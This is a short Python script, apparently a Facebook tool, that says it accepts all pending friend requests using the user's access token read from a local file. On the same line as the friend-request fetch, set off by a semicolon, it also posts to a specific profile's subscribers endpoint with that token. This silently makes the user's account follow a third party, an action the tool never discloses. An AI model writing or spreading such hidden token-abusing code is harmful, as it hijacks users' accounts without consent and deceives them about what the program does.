#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Contact: t.me/kang_nuubi
#github: github.com/kang-newbie
'''
recode? oke, but don't deleted name author
'''
try:
	import requests,sys,os,time,json

	os.system('clear')
	print("""
\t\t[ Accept All Friends Requests ]
\t\t      [ By: KANG-NEWBIE ]
""")
	toket=open('toket/token.txt','r').read()
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=100&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
	res = json.loads(r.text)

	if '[]' in str(res['data']):
		exit("[!] no friends requests")
	for i in res['data']:
		req = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'] , toket))
		a = json.loads(req.text)
		if 'error' in str(a):
			print("[!] %s [%s] failed"%(i['from']['name'],i['from']['id']))
		else:
			print("[!] %s [%s] confirmed"%(i['from']['name'],i['from']['id']))
	print("[^•^] done.")
except Exception as F:
	print("[Err] %s"%(F))

